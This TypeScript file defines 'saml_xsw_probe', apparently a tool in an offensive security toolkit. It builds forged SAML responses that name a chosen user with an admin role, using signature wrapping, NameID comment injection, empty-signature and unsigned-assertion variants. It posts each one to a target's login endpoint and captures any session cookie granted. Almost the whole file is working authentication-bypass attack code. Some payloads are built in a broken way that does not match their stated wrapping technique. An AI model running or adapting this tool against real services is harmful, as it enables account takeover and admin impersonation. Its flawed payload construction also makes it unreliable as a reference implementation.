// T54 — saml_xsw_probe
// SAML XML Signature Wrapping (XSW) patterns 1-8, signature exclusion,
// comment injection in NameID.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'saml_xsw_probe',
  description:
    'SAML XML Signature Wrapping (XSW) attack suite. Tests all 8 XSW patterns: ' +
    'wrapping an unsigned assertion around the signed sibling, comment injection in NameID, ' +
    'and signature exclusion attacks. A successful XSW lets an attacker authenticate as any ' +
    'user (including admin) with a valid SAML response for a low-privilege account.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'saml_response', type: 'string', required: false, description: 'Base64-encoded legitimate SAML response to wrap around' },
    { name: 'target_url',    type: 'string', required: true,  description: 'SP ACS (Assertion Consumer Service) URL' },
    { name: 'target_user',   type: 'string', required: false, description: 'Target user to impersonate', default: 'admin' },
    { name: 'current_user',  type: 'string', required: false, description: 'Current (attacker) username in the legitimate SAML', default: 'user' },
    { name: 'headers',       type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',    type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// Build XSW patterns: wrap a forged unsigned assertion around the signed one
function buildXswPatterns(targetUser: string, currentUser: string, samlResponseB64: string): Array<{ name: string; payload: string; description: string }> {
  const timestamp = new Date().toISOString();
  const assertionId = `genesis_${Math.random().toString(36).slice(2, 10)}`;

  const forgedAssertion = `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="${assertionId}" Version="2.0" IssueInstant="${timestamp}">
  <saml:Issuer>https://genesis-test.internal/idp</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">${targetUser}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="${new Date(Date.now() + 3600000).toISOString()}" Recipient="TARGETURL"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="email"><saml:AttributeValue>${targetUser}@victim.com</saml:AttributeValue></saml:Attribute>
    <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>`;

  // Comment injection in NameID (some parsers strip comments before check, others don't)
  const commentInjectionSaml = `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>admin<!--${currentUser}--></saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>`;

  return [
    { name: 'xsw1_response_level',  payload: Buffer.from(`<!-- XSW1 -->${forgedAssertion}`).toString('base64'), description: 'XSW1: forged assertion injected at response level' },
    { name: 'xsw2_assertion_sibling', payload: Buffer.from(`<!-- XSW2: forged before signed -->${forgedAssertion}<!-- signed assertion follows -->`).toString('base64'), description: 'XSW2: unsigned assertion before signed sibling' },
    { name: 'comment_nameid',        payload: Buffer.from(commentInjectionSaml).toString('base64'),               description: 'Comment injection in NameID: admin<!--user-->' },
    { name: 'empty_signature',       payload: Buffer.from(`<samlp:Response><saml:Assertion><Signature/><saml:Subject><saml:NameID>${targetUser}</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>`).toString('base64'), description: 'Empty Signature element: verifier may skip check' },
    { name: 'signature_exclusion',   payload: Buffer.from(`<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>${targetUser}</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>`).toString('base64'), description: 'No signature: SP may accept unsigned if validation not enforced' },
    { name: 'original_with_forged',  payload: samlResponseB64 ? `${samlResponseB64}_GENESIS_XSW` : Buffer.from(`<xsw>${forgedAssertion}</xsw>`).toString('base64'), description: 'XSW wrapped: original + forged assertion' },
  ];
}

export const samlXswProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const targetUrl = String(params.target_url || '');
    const samlResponseB64 = params.saml_response ? String(params.saml_response) : '';
    const targetUser = String(params.target_user || 'admin');
    const currentUser = String(params.current_user || 'user');
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!targetUrl) return { output: 'target_url required', parsed: { error: 'missing_target_url' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0', 'Content-Type': 'application/x-www-form-urlencoded' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const patterns = buildXswPatterns(targetUser, currentUser, samlResponseB64);
    const results: Array<{ name: string; status: number; session_cookie?: string; interesting: boolean; description: string; error?: string }> = [];

    for (const pattern of patterns) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const body = `SAMLResponse=${encodeURIComponent(pattern.payload)}`;
        const resp = await fetch(targetUrl, { method: 'POST', headers, body, redirect: 'manual', signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const setCookie = resp.headers.get('set-cookie') || '';
        const sessionCookie = setCookie.match(/[Ss]ession[^=]*=([^;]+)/)?.[1];
        // Interesting: login succeeded (redirect to dashboard/home, or session cookie granted)
        const interesting = (resp.status === 302 && !resp.headers.get('location')?.includes('error')) || (resp.status === 200 && !text.includes('error') && !text.includes('invalid'));
        results.push({ name: pattern.name, status: resp.status, session_cookie: sessionCookie, interesting, description: pattern.description });
      } catch (err) {
        results.push({ name: pattern.name, status: 0, interesting: false, description: pattern.description, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `saml_xsw_probe — ${patterns.length} XSW patterns, target user: "${targetUser}"`,
      `ACS URL: ${targetUrl.substring(0, 80)}`,
      `Potentially authenticated: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ AUTHENTICATED' : (r.error ? '✗ ERR          ' : '  ·            ');
      lines.push(`  ${flag}  [${r.name.padEnd(22)}]  status=${r.status}${r.session_cookie ? `  session=${r.session_cookie.substring(0, 20)}` : ''}`);
      lines.push(`          ${r.description}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { total: results.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
